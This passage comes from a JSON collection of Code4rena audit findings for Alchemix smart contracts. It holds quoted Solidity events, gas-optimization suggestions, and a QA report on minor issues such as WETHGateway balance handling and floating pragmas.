flag);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/ITransmuterBuffer.sol#L49\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/ITransmuterBuffer.sol   #48\r\n\r\n52:       event SetTransmuter(address underlyingToken, address transmuter);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/ITransmuterBuffer.sol#L52\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/IERC20Minimal.sol   #49\r\n\r\n11:       event Transfer(address indexed owner, address indexed recipient, uint256 amount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/IERC20Minimal.sol#L11\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/IERC20Minimal.sol   #50\r\n\r\n18:       event Approval(address indexed owner, address indexed spender, uint256 amount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/IERC20Minimal.sol#L18\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #51\r\n\r\n9:        event PendingAdminUpdated(address pendingAdmin);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L9\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #52\r\n\r\n14:       event AdminUpdated(address admin);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L14\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #53\r\n\r\n20:       event SentinelSet(address sentinel, bool flag);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L20\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #54\r\n\r\n26:       event KeeperSet(address sentinel, bool flag);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L26\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #55\r\n\r\n42:       event UnderlyingTokenEnabled(address indexed underlyingToken, bool enabled);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L42\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #56\r\n\r\n48:       event YieldTokenEnabled(address indexed yieldToken, bool enabled);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L48\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #57\r\n\r\n55:       event RepayLimitUpdated(address indexed underlyingToken, uint256 maximum, uint256 blocks);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L55\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #58\r\n\r\n62:       event LiquidationLimitUpdated(address indexed underlyingToken, uint256 maximum, uint256 blocks);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L62\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #59\r\n\r\n67:       event TransmuterUpdated(address transmuter);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L67\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #60\r\n\r\n72:       event MinimumCollateralizationUpdated(uint256 minimumCollateralization);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L72\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #61\r\n\r\n77:       event ProtocolFeeUpdated(uint256 protocolFee);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L77\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #62\r\n\r\n82:       event ProtocolFeeReceiverUpdated(address protocolFeeReceiver);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L82\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #63\r\n\r\n88:       event MintingLimitUpdated(uint256 maximum, uint256 blocks);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L88\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #64\r\n\r\n94:       event CreditUnlockRateUpdated(address yieldToken, uint256 blocks);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L94\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #65\r\n\r\n100:      event TokenAdapterUpdated(address yieldToken, address tokenAdapter);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L100\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #66\r\n\r\n106:      event MaximumExpectedValueUpdated(address indexed yieldToken, uint256 maximumExpectedValue);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L106\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #67\r\n\r\n112:      event MaximumLossUpdated(address indexed yieldToken, uint256 maximumLoss);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L112\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #68\r\n\r\n118:      event Snap(address indexed yieldToken, uint256 expectedValue);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L118\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #69\r\n\r\n124:      event SweepTokens(address indexed rewardToken, uint256 amount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L124\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #70\r\n\r\n131:      event ApproveMint(address indexed owner, address indexed spender, uint256 amount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L131\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #71\r\n\r\n150:      event Deposit(address indexed sender, address indexed yieldToken, uint256 amount, address recipient);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L150\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #72\r\n\r\n162:      event Withdraw(address indexed owner, address indexed yieldToken, uint256 shares, address recipient);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L162\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #73\r\n\r\n169:      event Mint(address indexed owner, uint256 amount, address recipient);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L169\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #74\r\n\r\n176:      event Burn(address indexed sender, uint256 amount, address recipient);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L176\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #75\r\n\r\n184:      event Repay(address indexed sender, address indexed underlyingToken, uint256 amount, address recipient);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L184\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #76\r\n\r\n199:      event Donate(address indexed sender, address indexed yieldToken, uint256 amount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L199\r\n\r\n```solidity\r\nFile: contracts-full/interfaces/alchemist/IAlchemistV2Events.sol   #77\r\n\r\n206:      event Harvest(address indexed yieldToken, uint256 minimumAmountOut, uint256 totalHarvested);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/interfaces/alchemist/IAlchemistV2Events.sol#L206\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #78\r\n\r\n72:       event AdminUpdated(address admin);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L72\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #79\r\n\r\n77:       event PendingAdminUpdated(address pendingAdmin);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L77\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #80\r\n\r\n82:       event OperatorUpdated(address operator);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L82\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #81\r\n\r\n87:       event RewardReceiverUpdated(address rewardReceiver);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L87\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #82\r\n\r\n92:       event TransmuterBufferUpdated(address transmuterBuffer);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L92\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #83\r\n\r\n97:       event ThreePoolSlippageUpdated(uint256 threePoolSlippage);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L97\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #84\r\n\r\n102:      event MetaPoolSlippageUpdated(uint256 metaPoolSlippage);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L102\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #85\r\n\r\n108:      event MintThreePoolTokens(uint256[NUM_STABLE_COINS] amounts, uint256 mintedThreePoolTokens);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L108\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #86\r\n\r\n115:      event MintThreePoolTokens(ThreePoolAsset asset, uint256 amount, uint256 mintedThreePoolTokens);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L115\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #87\r\n\r\n122:      event BurnThreePoolTokens(ThreePoolAsset asset, uint256 amount, uint256 withdrawn);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L122\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #88\r\n\r\n128:      event MintMetaPoolTokens(uint256[NUM_META_COINS] amounts, uint256 mintedThreePoolTokens);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L128\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #89\r\n\r\n135:      event MintMetaPoolTokens(MetaPoolAsset asset, uint256 amount, uint256 minted);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L135\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #90\r\n\r\n142:      event BurnMetaPoolTokens(MetaPoolAsset asset, uint256 amount, uint256 withdrawn);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L142\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #91\r\n\r\n148:      event DepositMetaPoolTokens(uint256 amount, bool success);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L148\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #92\r\n\r\n154:      event WithdrawMetaPoolTokens(uint256 amount, bool success);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L154\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #93\r\n\r\n161:      event ClaimRewards(bool success, uint256 amountCurve, uint256 amountConvex);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L161\r\n\r\n```solidity\r\nFile: contracts-full/ThreePoolAssetManager.sol   #94\r\n\r\n167:      event ReclaimThreePoolAsset(ThreePoolAsset asset, uint256 amount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/ThreePoolAssetManager.sol#L167\r\n\r\n```solidity\r\nFile: contracts-full/CrossChainCanonicalBase.sol   #95\r\n\r\n188:      event BridgeTokenToggled(address indexed bridgeTokenAddress, bool state);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/CrossChainCanonicalBase.sol#L188\r\n\r\n```solidity\r\nFile: contracts-full/CrossChainCanonicalBase.sol   #96\r\n\r\n189:      event SwapFeeSet(address indexed bridgeTokenAddress, uint bridgeToCanonical, uint canonicalToOld);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/CrossChainCanonicalBase.sol#L189\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #97\r\n\r\n59:       event AdminUpdated(address admin);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L59\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #98\r\n\r\n64:       event PendingAdminUpdated(address pendingAdmin);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L64\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #99\r\n\r\n69:       event OperatorUpdated(address operator);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L69\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #100\r\n\r\n74:       event RewardReceiverUpdated(address rewardReceiver);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L74\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #101\r\n\r\n79:       event TransmuterBufferUpdated(address transmuterBuffer);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L79\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #102\r\n\r\n84:       event MetaPoolSlippageUpdated(uint256 metaPoolSlippage);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L84\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #103\r\n\r\n90:       event MintMetaPoolTokens(uint256[NUM_META_COINS] amounts, uint256 mintedThreePoolTokens);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L90\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #104\r\n\r\n97:       event MintMetaPoolTokens(MetaPoolAsset asset, uint256 amount, uint256 minted);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L97\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #105\r\n\r\n104:      event BurnMetaPoolTokens(MetaPoolAsset asset, uint256 amount, uint256 withdrawn);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L104\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #106\r\n\r\n110:      event DepositMetaPoolTokens(uint256 amount, bool success);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L110\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #107\r\n\r\n116:      event WithdrawMetaPoolTokens(uint256 amount, bool success);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L116\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #108\r\n\r\n123:      event ClaimRewards(bool success, uint256 amountCurve, uint256 amountConvex);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L123\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #109\r\n\r\n128:      event ReclaimEth(uint256 amount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L128\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #110\r\n\r\n134:      event SweepToken(address token, uint256 amount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L134\r\n\r\n```solidity\r\nFile: contracts-full/EthAssetManager.sol   #111\r\n\r\n139:      event SweepEth(uint256 amount);\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/71abbe683dfd5c0686b7e594fb4f78a14b668d8b/contracts-full/EthAssetManager.sol#L139\r\n\r\n### 19. Use allowlist/denylist rather than blacklist/whitelist\r\n\r\n*There is 1 instance of this issue:*\r\n```solidity\r\nFile: contracts-full/AlchemicTokenV1.sol   #1\r\n\r\n110:   function setBlacklist(address minter) external onlySentinel {\r\n```\r\nhttps://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/AlchemicTokenV1.sol#L110\r\n",
    "dataSource": {
      "name": "code-423n4/2022-05-alchemix-findings",
      "repo": "https://github.com/code-423n4/2022-05-alchemix-findings",
      "url": "https://github.com/code-423n4/2022-05-alchemix-findings/issues/228"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "## Gas\n\n### Declare `TransmuterConduit` state variables immutable\n\nThe `token`, `sourceTransmuter`, and `sinkTransmuter` variables in `TransmuterConduit` are set permanently at construction time. They can be declared `immutable` to save runtime gas.\n\n[`TransmuterConduit`](https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/TransmuterConduit.sol#L12-L25)\n\n```solidity\n    /// @notice The address of the underlying token that is being transmuted.\n    address public token;\n\n    /// @notice The address of the transmuter to pull funds from.\n    address public sourceTransmuter;\n\n    /// @notice The address of the transmuter to send funds to;.\n    address public sinkTransmuter;\n\n    constructor(address _token, address _source, address _sink) {\n        token = _token;\n        sourceTransmuter = _source;\n        sinkTransmuter = _sink;\n    }\n```\n\n### Declare `StakingPool` reward token immutable\n\nSimilarly, the `reward` token in `StakingPool` can be declared `immutable`: \n\n[`StakingPool`](https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/StakingPools.sol#L81-L82)\n\n```solidity\n  /// @dev The token which will be minted as a reward for staking.\n  IERC20Mintable public reward;\n```",
    "dataSource": {
      "name": "code-423n4/2022-05-alchemix-findings",
      "repo": "https://github.com/code-423n4/2022-05-alchemix-findings",
      "url": "https://github.com/code-423n4/2022-05-alchemix-findings/issues/219"
    }
  },
  {
    "title": "QA Report",
    "body": "## Low\n\n### WETH Gateway transfers out full contract balance\n\n`WethGateway#withdrawUnderlying` unwraps and transfers the contract's full WETH balance to `recipient`:\n\n[`WethGateway#withdrawUnderlying`](https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/WETHGateway.sol#L56-L79)\n\n```solidity\n    function withdrawUnderlying(\n        address alchemist,\n        address yieldToken,\n        uint256 shares,\n        address recipient,\n        uint256 minimumAmountOut\n    ) external {\n        _onlyWhitelisted();\n        // Ensure that the underlying of the target yield token is in fact WETH\n        IAlchemistV2.YieldTokenParams memory params = IAlchemistV2(alchemist).getYieldTokenParameters(yieldToken);\n        if (params.underlyingToken != address(WETH)) {\n            revert IllegalArgument();\n        }\n\n        IAlchemistV2(alchemist).withdrawUnderlyingFrom(msg.sender, yieldToken, shares, address(this), minimumAmountOut);\n\n        uint256 amount = WETH.balanceOf(address(this));\n        WETH.withdraw(amount);\n\n        (bool success, ) = recipient.call{value: amount}(new bytes(0));\n        if (!success) {\n            revert IllegalState();\n        }\n    }\n```\n\nIf the gateway contract has an existing WETH balance, (for example, if a third party has accidentally or intentionally transferred WETH to the contract address), the caller may receive more ETH than expected.\n\nSuggestion: use the return value of `IAlchemistV2(alchemist).withdrawUnderlyingFrom`.\n\n## Noncritical \n\n### Staking pools are incompatible with fee-on-transfer tokens\n\nThe internal accounting in `StakingPools` credits users with an amount equal to the `_depositAmount` argument: \n\n[`StakingPools#_deposit`[(https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/StakingPools.sol#L375-L385)\n\n```solidity\n  function _deposit(uint256 _poolId, uint256 _depositAmount) internal {\n    Pool.Data storage _pool = _pools.get(_poolId);\n    Stake.Data storage _stake = _stakes[msg.sender][_poolId];\n\n    _pool.totalDeposited = _pool.totalDeposited + _depositAmount;\n    _stake.totalDeposited = _stake.totalDeposited + _depositAmount;\n\n    _pool.token.safeTransferFrom(msg.sender, address(this), _depositAmount);\n\n    emit TokensDeposited(msg.sender, _poolId, _depositAmount);\n  }\n```\n\nHowever, if the pool token is a fee-on-transfer ERC20, the amount received from `safeTransferFrom` on line 382 may be less than `_depositAmount`. This could impact reward accounting and potentially cause attempted withdrawals to revert for unlucky users.\n\nSince the supported tokens are permissioned, this is a noncritical issue, but be aware of this incompatibility.\n\n## QA\n\n### Restrict `_isLocked` mutability to `view`\n\n[`Mutex#_isLocked`](https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/base/Mutex.sol#L27-L29) can be declared a `view`:\n\n```solidity\n    function _isLocked() internal returns (bool) {\n        return _lockState == 1;\n    }\n```\n\n### Missing address input validations\n\nAddress inputs are validated in most locations, but are not validated in a few places. Consider whether a zero or invalid address would impact these contracts.\n\n- [`TransmuterBuffer#initialize`](https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/TransmuterBuffer.sol#L84)\n\n### Unlocked version pragmas\n\nIt's a best practice to lock version pragmas for concrete contracts. Many contracts are using a fixed `0.8.13` pragma, but the following contracts have a floating `^0.8.11` pragma:\n\n- `AlchemicTokenV1`\n- `AlchemicTokenV2`\n- `AlchemicTokenV2Base`\n- `AlchemistV2`\n- `AutoleverageBase`\n- `AutoleverageCurveFactoryethpool`\n- `AutoleverageCurveMetapool`\n- `CrossChainCanonicalAlchemicTokenV2`\n- `CrossChainCanonicalBase`\n- `CrossChainCanonicalGALCX`\n- `gALCX`\n- `StakingPools`\n- `TransmuterBuffer`\n- `TransmuterV2`\n- `WETHGateway`\n- `YearnTokenAdapter`\n- `Multicall`\n\n### Unused imports\n- `Math.sol` in [`TransmuterBuffer`](https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/TransmuterBuffer.sol#L6)\n- `LiquidityMath.sol` in [`TransmuterBuffer`](https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/TransmuterBuffer.sol#L17)\n\n### Incorrect comments\n- Natspec for [`TransmuterV2#notPaused`](https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/TransmuterV2.sol#L182)\n\n### Typos\n- `normalizedAmount` in [`TransmuterV2#exchange`](https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/TransmuterV2.sol#L251)\n- `for` in comment for [`TransmuterBuffer#lastFlowrateUpdate`](https://github.com/code-423n4/2022-05-alchemix/blob/de65c34c7b6e4e94662bf508e214dcbf327984f4/contracts-full/TransmuterBuffer.sol#L48)\n",
    "dataSource": {
      "name": "code-423n4/2022-05-alchemix-findings",
      "repo": "https://github.com/code-423n4/2022-05-alchemix-findings",
      "url": "https://github.com/code-423n4/2022-05-alchemix-findings/issues/218"
    }
  },
  {
    "title": "QA Report",
